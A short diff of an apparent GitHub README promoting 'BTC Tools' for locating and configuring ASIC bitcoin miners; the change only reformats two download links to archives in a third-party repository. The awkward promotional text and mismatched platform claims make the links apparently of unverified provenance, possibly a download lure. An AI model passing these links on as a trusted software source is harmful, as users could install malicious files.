@@ -9,8 +9,8 @@ Many people who are professionally mining nowadays do not understand how to find
 
 In general, many have such a problem, after purchasing an ASIC, and given that the problem is not so large-scale, since not a very large number of people are interested in this topic, then find information on finding an ASIC, as well as how to connect to it by IP and the most the main thing is to correctly configure all equipment. Actually, in this article you will get acquainted with a utility called BTC Tools and learn how to download it, install it on your mining equipment, as well as where to download btc tools on your computer to solve such a sensitive problem as finding an ASIC, so that you can then configure it and earn your own money in the maximum amount on bitcoins.
 
-+ [Download BTCTools v1.3.3 for for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/BTCTool_v.1.3.3.rar)
-+ [Download SetMinersStaticIP v1.3.4 for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/Set.Miners.Static.IP.v1.3.4.win.zip)
+- [ ] [Download BTCTools v1.3.3 for for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/BTCTool_v.1.3.3.rar)
+- [ ] [Download SetMinersStaticIP v1.3.4 for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/Set.Miners.Static.IP.v1.3.4.win.zip)
 ------------------------------------------------
 
 ## BTC Tools features, introduces the following features:
